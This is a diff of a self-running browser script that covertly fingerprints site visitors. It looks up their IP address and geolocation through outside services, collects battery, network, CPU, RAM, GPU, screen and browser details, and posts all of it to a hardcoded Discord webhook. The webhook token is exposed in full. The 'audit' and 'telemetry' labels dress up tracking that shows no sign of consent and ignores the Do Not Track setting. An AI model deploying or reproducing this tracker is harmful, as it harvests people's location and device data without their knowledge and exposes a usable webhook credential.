@@ -2,57 +2,118 @@
 
     const WEBHOOK_URL = 'https://discord.com/api/webhooks/1537225175685267567/f1CPvfGdBNgmbah5ow0f_kVosxyijB-mXEsNAIVaxxOoi_6Klu7ZhScLJYbtpptSh06A';
 
-    let visitorIp = 'Unavailable';
-
-    try {
-
-        const ipResponse = await fetch('https://ipify.org');
-        if (ipResponse.ok) {
-            visitorIp = await ipResponse.text();
+    async function getIpAndGeo() {
+        const providers = [
+            'https://ipapi.co',
+            'https://ipwho.is',
+            'https://ipify.org'
+        ];
+        for (const url of providers) {
+            try {
+                const res = await fetch(url, { signal: AbortSignal.timeout(2500) });
+                if (res.ok) {
+                    const data = await res.json();
+                    if (url.includes('ipapi.co')) {
+                        return {
+                            ip: data.ip || 'Unknown',
+                            geo: `${data.city || 'Unknown'}, ${data.region || 'Unknown'}, ${data.country_name || 'Unknown'} (${data.org || 'Unknown'})`
+                        };
+                    }
+                    if (url.includes('ipwho.is')) {
+                        return {
+                            ip: data.ip || 'Unknown',
+                            geo: `${data.city || 'Unknown'}, ${data.region || 'Unknown'}, ${data.country || 'Unknown'} (${data.connection?.isp || 'Unknown'})`
+                        };
+                    }
+                    return { ip: data.ip || 'Unknown', geo: 'Geo Blocked/Unavailable' };
+                }
+            } catch (e) {}
         }
-    } catch (ipError) {
-
-        console.warn("IP resolution skipped or blocked.");
+        return { ip: 'Unavailable', geo: 'Unavailable' };
     }
 
-    try {
+    async function getBattery() {
+        try {
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                return `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})`;
+            }
+        } catch (e) {}
+        return 'Unsupported';
+    }
 
-        const trackingData = {
-            "Public IP": visitorIp,
-            "Host URL": window.location.href,
-            "User Agent": navigator.userAgent,
-            "Platform": navigator.platform || 'Unknown',
-            "Language": navigator.language,
-            "Screen": `${window.screen.width}x${window.screen.height}`,
-            "Time Zone": Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
-            "Referrer": document.referrer || 'Direct',
-            "Timestamp": new Date().toISOString()
+    function getConnection() {
+        const n = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        if (n) {
+            return `Type: ${n.type || 'unknown'} | Downlink: ${n.downlink || 'unknown'}Mbps | Effective: ${n.effectiveType || 'unknown'}`;
+        }
+        return 'Unsupported';
+    }
+
+    function getHardwareDetails() {
+        let gpu = 'Unknown';
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (gl) {
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if (debugInfo) {
+                    gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                }
+            }
+        } catch (e) {}
+        return {
+            cores: navigator.hardwareConcurrency || 'Unknown',
+            ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown',
+            gpu: gpu
         };
+    }
 
+    const netInfo = await getIpAndGeo();
+    const battery = await getBattery();
+    const hardware = getHardwareDetails();
 
-        const fields = Object.entries(trackingData).map(([key, value]) => ({
-            name: key,
-            value: String(value).substring(0, 1024),
-            inline: true
-        }));
+    const report = {
+        "IP Address": netInfo.ip,
+        "Location / ISP": netInfo.geo,
+        "Current URL": window.location.href,
+        "Referrer": document.referrer || 'Direct Visit',
+        "Device Battery": battery,
+        "Network Profile": getConnection(),
+        "CPU Cores / RAM": `${hardware.cores} Cores / ${hardware.ram}`,
+        "GPU Renderer": hardware.gpu,
+        "Screen Geometry": `${window.screen.width}x${window.screen.height} (${window.devicePixelRatio || 1}x)`,
+        "Browser Viewport": `${window.innerWidth}x${window.innerHeight}`,
+        "Operating System": navigator.platform || 'Unknown',
+        "Browser Language": navigator.language,
+        "Timezone Profile": Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
+        "Cookies Enabled": navigator.cookieEnabled ? 'Yes' : 'No',
+        "Do Not Track": navigator.doNotTrack || 'Not Set',
+        "Timestamp UTC": new Date().toISOString()
+    };
 
+    const fields = Object.entries(report).map(([key, value]) => ({
+        name: key,
+        value: String(value).substring(0, 1024),
+        inline: true
+    }));
 
+    try {
         await fetch(WEBHOOK_URL, {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
+            headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-                content: "🚀 **Site Interaction Logged**",
+                content: "🛑 **Advanced Environment Audit Logged**",
                 embeds: [{
-                    title: "Environment Analytics",
-                    color: 3447003,
-                    fields: fields
+                    title: "System Hardware & Network Intelligence Report",
+                    color: 16711712,
+                    fields: fields,
+                    footer: { text: "Advanced Telemetry Instance" }
                 }]
             })
         });
-
     } catch (err) {
-        console.error("Tracking execution failed:", err);
+        console.error(err);
     }
 })();
+
